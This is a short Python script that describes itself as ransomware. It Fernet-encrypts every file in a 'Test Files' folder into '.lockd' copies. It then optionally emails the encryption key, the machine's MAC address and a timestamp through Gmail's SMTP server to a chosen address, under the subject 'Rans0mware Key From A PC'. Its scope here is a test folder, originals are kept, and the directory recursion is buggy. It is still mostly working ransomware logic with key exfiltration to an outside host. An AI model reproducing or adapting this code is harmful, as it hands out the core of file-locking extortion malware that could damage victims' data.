import datetime
import os
import re
import shutil
import smtplib
import ssl
import uuid
from email.message import EmailMessage

from cryptography.fernet import Fernet

os.system("CLS")

sendMail = input("Write exit to abort. Do you want to receive an email (Y/N):")
if sendMail.lower() == "exit":
    exit()
elif sendMail.lower() == "y":
    print("An e-mail will be sent to provided email adress.")
else:
    print("No e-mail will be sent.")

if os.path.exists("Encrypted"):
    shutil.rmtree("Encrypted")
if os.path.exists("Decrypted"):
    shutil.rmtree("Decrypted")


def encrpytFiles(fl):
    for i in range(len(fl)):
        if os.path.isdir(fl[i]):
            continue
        with open(fl[i], "rb") as file:
            f = file.read()
            data = bytes(f)
        name = "\\".join(fl[i].split("\\")[-2:])
        if not os.path.exists("Encrypted"):
            os.mkdir("Encrypted")
        if not os.path.exists("Encrypted\\" + name.split("\\")[-2]):
            os.mkdir("Encrypted\\" + name.split("\\")[-2])
        with open("Encrypted\\" + name + ".lockd", "wb") as locked:
            locked.write(fernet.encrypt(data))


def getFiles(dir=os.path.abspath("Test Files")):
    _files = []
    for file in os.listdir(dir):
        if os.path.isdir(file):
            recFiles = getFiles(os.path.join(dir,file))
            for f in recFiles:
                _files.append(os.path.abspath(file))
        else:
            _files.append(os.path.join(dir,file))
    return _files


key = Fernet.generate_key()
fernet = Fernet(key)

files = getFiles()
encrpytFiles(files)

if sendMail.lower() == "y":
    context = ssl.create_default_context()
    message = EmailMessage()
    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
        mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))

        sender = "mrsfanonmail@gmail.com"
        receiver = input("Please write your email adress: ")
        regex = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
        print("Checking email...")
        while not re.fullmatch(regex, receiver):
            print("Invalid Email. Please enter again or write exit to exit.")
            receiver = input("Please write your email adress: ")
            if receiver == "exit":
                exit()
        print("Correct email. Proceeding...")
        password = open("googleapppasword.txt").read()
        processID = uuid.uuid4()

        message.set_content("".join(
            ["key: ", str(key), "\nfrom: ", mac, "\ndate: ", datetime.datetime.today().strftime('%Y-%m-%d %H:%M:%S'),
             "\nprocessID: ", str(processID)]))
        message["Subject"] = "Rans0mware Key From A PC"
        message["From"] = sender
        message["To"] = receiver

        server.login(sender, password)
        server.send_message(message)

    with open("key.yek", "w") as thekey:
        processID = uuid.uuid4()
        mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        data = "".join(
            ["key: ", str(key), "\nfrom: ", mac, "\nat: ", datetime.datetime.today().strftime('%Y-%m-%d %H:%M:%S'),
             "\nID: ", str(processID) + "\n"])
        thekey.write(data)

    print("message: ", message, "\nEmail sent successfully.")
else:
    with open("key.yek", "w") as thekey:
        processID = uuid.uuid4()
        mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        data = "".join(
            ["key: ", str(key), "\nfrom: ", mac, "\nat: ", datetime.datetime.today().strftime('%Y-%m-%d %H:%M:%S'),
             "\nID: ", str(processID) + "\n"])
        thekey.write(data)
print("Files encrypted successfully. All information about encryption is in the file 'key.yek'.")
